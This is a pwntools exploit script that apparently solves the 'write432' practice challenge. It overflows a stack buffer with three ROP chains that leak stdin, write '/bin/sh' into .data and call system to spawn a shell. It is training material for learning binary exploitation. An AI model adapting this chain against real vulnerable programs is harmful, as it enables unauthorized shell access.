from pwn import *

BUFFER_LEN = 44

e = ELF("./write432")
p = process(e.path)
p.recv()

#Searching symbols on the binary

printf  = e.symbols[b"printf"]
main    = e.symbols[b"main"]
stdin   = e.symbols[b"stdin"]
fgets   = e.symbols[b"fgets"]
buffer_mem = 0x0804a028 #.data

# ROP Chain #1 - Leaking stdin
print("[!] ROP CHAIN #1")
rop = ROP(e)
rop.call(printf, (stdin,))
rop.call(main, (0,0,0,))
payload = (b"\x41" * BUFFER_LEN) + rop.chain()

p.sendline(payload)
data = p.recv()
stdin_buf = unpack(data[0:4]) #receiving the stdin leaked address

print(f"Found STDIN leak: {stdin_buf}")

# ROP Chain #2 - Adding data to the location
print("[!] ROP CHAIN #2")
rop = ROP(e)
rop.call(fgets, (buffer_mem, 0x15, stdin_buf,))
rop.call(main, (0,0,0,))
payload = (b"\x41" * BUFFER_LEN) + rop.chain()

p.sendline(payload)
p.sendline("/bin/sh")
p.recv()

# ROP Chain #3 - Executing command
print("[!] ROP CHAIN #3")
rop = ROP(e)
rop.system(buffer_mem)
payload = (b"\x41" * BUFFER_LEN) + rop.chain()

p.sendline(payload)
print(p.recv())

p.interactive()

